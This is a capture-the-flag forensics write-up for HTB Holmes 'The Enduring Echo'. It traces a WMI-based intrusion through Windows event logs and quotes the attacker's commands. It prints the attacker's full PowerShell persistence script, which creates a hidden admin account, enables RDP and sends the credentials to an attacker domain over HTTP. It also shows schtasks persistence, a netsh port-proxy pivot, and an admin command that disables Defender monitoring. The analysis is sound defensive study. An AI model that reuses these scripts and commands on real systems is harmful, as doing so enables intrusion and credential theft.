# The Enduring Echo – Holmes CTF (HTB 2025)

> **Category**: Disk Forensics, Windows Event Log Analysis, Persistence, Lateral Movement  
> **Challenge Focus**: Disk image analysis, Windows Security event parsing, timeline reconstruction, persistence/script analysis, and internal pivot detection.

---

## Overview

This challenge provided a Windows disk image and associated artifacts. The goal was to reconstruct attacker activity: remote execution, file/hosts modification, scheduled-task persistence, credential exfiltration, account creation, and internal pivoting via port proxy.  

My hands‑on analysis focused on extracting Windows Security event logs, parsing them with Eric Zimmerman’s tools, building a timeline in Timeline Explorer, and reviewing extracted scripts and scheduled task metadata to answer the challenge questions.

Primary files examined: parsed EVTX exports (`evtx-parsed.csv`), `JM.ps1` (persistence script), scheduled task XML, and timeline exports.

---
LeStrade passes a disk image artifacts to Watson. It's one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.

## Q01 – What was the first (non `cd`) command executed by the attacker on the host?

**Answer**:  
`systeminfo`

**How it was found**:  
Parsed the Windows Security event logs with Eric Zimmerman’s `EvtxECmd.exe` (exported to CSV) and loaded the CSV into Timeline Explorer. Filtering for **Event ID 4688** (Process Creation) and searching the `CommandLine` field for `cmd` revealed the sequence of commands executed by the attacker. The timeline shows the attacker used `WmiPrvSE.exe` to spawn `cmd.exe`; the first command after the initial `cd` was `systeminfo`.

**Evidence: **
```text
# command used to export EVTX -> CSV (used prior to analysis)
EvtxECmd.exe -d "The_Enduring_Echo\The_Enduring_Echo\C\Windows\System32\winevt\logs" --csv . --csvf evtx.csv

```
## Q02 – Which parent process (full path) spawned the attacker’s commands?

**Answer:**  
`C:\Windows\System32\wbem\WmiPrvSE.exe`

**How it was found:**  
Event ID **4688** (Process Creation) entries include parent/process fields and the command line. After exporting the EVTX files to CSV with `EvtxECmd.exe` and loading the CSV into Timeline Explorer, the `cmd.exe` executions were shown with `WmiPrvSE.exe` as the parent. On Windows `WmiPrvSE.exe` commonly lives under the `wbem` folder, and the full path observed in the artifacts is `C:\Windows\System32\wbem\WmiPrvSE.exe`.

**Evidence :**
![Event ID 4688 in Timeline Explorer](/HTB-Holmes-CTF/arifacts/the_enduring_echo/eventid_4688_timeline.png)

## Q03 – Which remote-execution tool was most likely used for the attack?

**Answer:**  
`wmiexec.py`

**How it was found:**  
The observed pattern—`WmiPrvSE.exe` spawning `cmd.exe` with sequences of remote commands (for example `systeminfo`, `whoami`)—is characteristic of WMI‑based remote execution. The timing, parent→child process relationships, and the `Process Command Line` content in Event ID **4688** match behavior commonly produced by `wmiexec.py` (a WMI remote‑execution utility found in offensive toolkits). These indicators in the parsed logs support the inference that `wmiexec.py` was most likely used.

Note: Event ID 4688 was critical to this analysis because, when command-line auditing is enabled, it includes the Process Command Line field — allowing us to see exact commands and infer the remote-execution tooling used.

## Q04 – What was the attacker’s IP address? (IPv4 address)

**Answer:**  
`IP_REDACTED`

**How it was found:**  
While examining the parsed Event ID **4688** command-line entries and the timeline, we observed a command that appended a domain-to-IP mapping into the Windows `hosts` file. The command contained the attacker-controlled IP next to the exfiltration domain `NapoleonsBlackPearl.htb`. For privacy, the IP has been redacted in this public report.

**Evidence (sanitized excerpt / command line):**
```text
# Command observed in Event ID 4688 (sanitized)
C:\Windows\System32\cmd.exe cmd.exe /Q /c cmd /C "echo IP_REDACTED NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts" 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
```
## Q05 – What is the first element in the attacker's sequence of persistence mechanisms? (string)

**Answer:**  
`Scheduled Task (SysHelper Update)`

**How it was found:**  
The parsed Event ID **4688** command lines and scheduled task exports show the attacker created a scheduled task named **SysHelper Update** to run a PowerShell script on a recurring schedule. The `schtasks /create` invocation at `2025-08-24 23:03:50.2566689` establishes the scheduled task as the first persistence mechanism observed.

**Evidence (sanitized command line):**
```text
C:\Windows\System32\cmd.exe cmd.exe /Q /c schtasks /create /tn "SysHelper Update" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\AppData\Local\JM.ps1" /sc minute /mo 2 /ru SYSTEM /f 1> \\IP_REDACTED\ADMIN$\__1756076432.886685 2>&1
```
## Q06 – Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)

**Answer:**  
`C:\Users\Werni\AppData\Local\JM.ps1`

**How it was found:**  
Found this path in the above scheduled task

## Q07 – What local account did the attacker create? (string)

**Answer:**  
`svc_netupd`

**How it was found:**  
Parsed Windows Security events for **Event ID 4720** (A user account was created). The exported CSV and Timeline Explorer view show a user creation event corresponding to `svc_netupd` with a timestamp of `2025-08-24T23:05:09.7646587`. This confirms the attacker created the `svc_netupd` local account as part of their persistence workflow.

**Evidence:**
![User Account Creation screenshot](/HTB-Holmes-CTF/arifacts/the_enduring_echo/user_account_creation.png)

## Q08 – What domain name did the attacker use for credential exfiltration? (domain)

**Answer:**  
`NapoleonsBlackPearl.htb`

**How it was found:**  
I examined the extracted persistence PowerShell script `JM.ps1` (path: `The_Enduring_Echo/…/C/Users/Werni/AppData/Local/JM.ps1`). The script selects a username from an array, generates a timestamp-based password, creates the account, and then exfiltrates the credentials to an attacker-controlled domain. The domain name is hard-coded in the script and appears in the exfiltration routine.

```
# List of potential usernames
$usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")

# Check for existing user
$existing = $usernames | Where-Object {
    Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
}

# If none exist, create a new one
if (-not $existing) {
    $newUser = Get-Random -InputObject $usernames
    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
    $password = "Watson_$timestamp"

    $securePass = ConvertTo-SecureString $password -AsPlainText -Force

    New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
    Add-LocalGroupMember -Group "Administrators" -Member $newUser
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser

    # Enable RDP
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}
```
## Q09 – What password did the attacker's script generate for the newly created user? (string)

**Answer:**  
`Watson_20250824160509`

**How it was found:**  
`JM.ps1` generates passwords using a fixed prefix (`Watson_`) plus the script execution timestamp. Although the user creation event (`svc_netupd`) shows a UTC timestamp of `2025-08-24T23:05:09.7646587`, the scheduled task metadata indicates the script was configured to run at **local time** `2025-08-24T16:03:00` (with a 2‑minute interval). Accounting for the local time used by the scheduled task (and the task’s actual execution offset), the timestamp portion used by the script resolves to `20250824160509`, producing the final password `Watson_20250824160509`.

**Evidence (sanitized references):**
```text
# User creation event (sanitized)
2025-08-24T23:05:09.7646587,4720,...,svc_netupd,...

<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2025-08-24T16:03:50</Date>
    <Author>HEISEN-9-WS-6\Werni</Author>
    <URI>\SysHelper Update</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT2M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2025-08-24T16:03:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell</Command>
      <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
</Task>
```
## Q10 – What was the IP address of the internal system the attacker pivoted to? (IPv4 address)

**Answer:**  
`ATTACKER_IP_REDACTED`

**How it was found:**  
Timeline entries and parsed Event ID **4688** command lines show the attacker executed `proxy.bat`, which in turn called `netsh interface portproxy` to forward traffic. The `connectaddress` parameter in the `netsh` command indicates the internal target IP the attacker pivoted to — redacted here for privacy.

**Evidence:**
```text
# proxy.bat executed (sanitized)
C:\Windows\System32\cmd.exe cmd.exe /Q /c .\proxy.bat 1> \\ATTACKER_IP_REDACTED\ADMIN$\__1756076432.886685 2>&1

# netsh portproxy command (sanitized)
C:\Windows\System32\netsh.exe netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=ATTACKER_IP_REDACTED connectport=22
```
![attacker_IP](/HTB-Holmes-CTF/arifacts/the_enduring_echo/eventd_4688_attackIP.png)

## Q11 – Which TCP port on the victim was forwarded to enable the pivot? (port 0-65535)

**Answer:**  
`9999`

**How it was found:**  
listenaddress=0.0.0.0 indicates the proxy listened on all IPv4 interfaces.
Incoming connections to 9999 on the compromised host were forwarded to the internal target (connectport 22), enabling SSH pivoting.

## Q12 – What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM......)

**Answer:**  
`HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp`

---

**How it was found:**

   - Observing `netsh interface portproxy` activity in parsed event logs / command-line artifacts (Event ID 4688 entries showing the `netsh` command or `proxy.bat` usage).  
   - Knowing the attacker used `netsh portproxy` to create a persistent proxy, we then search for the provided registry hive dump for strings like `PortProxy`, `portproxy`, `v4tov4`, or the port number (e.g., `9999`).  
   - The search returned the `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp` key and the saved listener→target mappings.

## Q13 – What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)

**Answer:**  
`T1090.001`

**How it was found:**  
The behavior of using a compromised host as an internal proxy to reach other internal systems—is classified by MITRE ATT&CK as **Proxy: Internal Proxy**, which corresponds to **T1090.001**.

**Evidence:**
![MITRE_ATT&CK](/HTB-Holmes-CTF/arifacts/the_enduring_echo/MITRE_ATTACK.png)

## Q14 – Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)

**Answer:**  
```powershell
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
auditpol /set /subcategory:"Process Creation" /success:enable
```
**How it was found:**  
Checked the PowerShell history file (ConsoleHost_history.txt) at The_Enduring_Echo\The_Enduring_Echo\C\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine and found commands related to enabling command‑line capture in the event logs.
```
ipconfig
powershell New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 172.18.6.3 -PrefixLength 24
ipconfig.exe
powershell New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 10.129.233.246 -PrefixLength 24
ipconfig
ncpa.cpl
ipconfig
ping 1.1.1.1
cd C:\Users\
ls
net user Werni Quantum1! /add
ls
net localgroup administrator Werni /add
net localgroup Administrators Werni /add
clear
wmic computersystem where name="%COMPUTERNAME%" call rename name="Heisen-9-WS-6"
ls
cd ..
ls
cd .\Users\
ls
net users
Rename-Conputer -NewName "Heisen-9-WS-6" -Force
Rename-Computer -NewName "Heisen-9-WS-6" -Force
net users
ls
net user felamos /delete
cd ..
ls
net users
cat .\Werni\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
Enable-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)"
Enable-NetFirewallRule -DisplayGroup "Remote Event Log Management"
Enable-NetFirewallRule -DisplayGroup "Remote Service Management"
auditpol /set /subcategory:"Process Creation" /success:enable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
Set-MpPreference -DisableRealtimeMonitoring $true
Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled
```